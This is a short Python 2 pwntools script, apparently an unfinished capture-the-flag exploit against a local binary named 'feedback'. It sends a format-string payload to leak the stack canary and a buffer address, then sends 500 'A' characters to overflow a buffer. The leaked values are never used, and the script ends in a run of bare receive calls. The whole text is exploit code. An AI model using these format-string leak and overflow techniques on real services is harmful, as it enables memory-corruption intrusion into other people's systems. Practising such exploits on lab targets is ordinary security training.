#!/usr/bin/env python

from pwn import *
import sys, struct

def firstpwn():
	p=process(['./feedback'])
	print util.proc.pidof(p)		#getting pid to attach debugger
	#sys.stdin.read(1)			#prevent process from terminating
	print p.recv()
	p.sendline("AAAA"+"%31$x"+"%1$x")
	leak=p.recv()
	canary=leak[42:50]
	buff=leak[50:58]
	print "Canary--"+canary
	print "Buffer--"+buff
	canary=int(canary,16)
	buff=int(buff,16)

	p.recv()
	p.sendline("A"*500)
	

	p.recv()
	p.recv()
	p.recv()
	p.recv()
	p.recv()
	p.recv()
	p.recv()
	p.recv()
	p.recv()
	p.recv()
	p.recv()
	p.recv()
if __name__== "__main__":
	try:
		firstpwn()
	except:
		print "unable to run firstpwn"

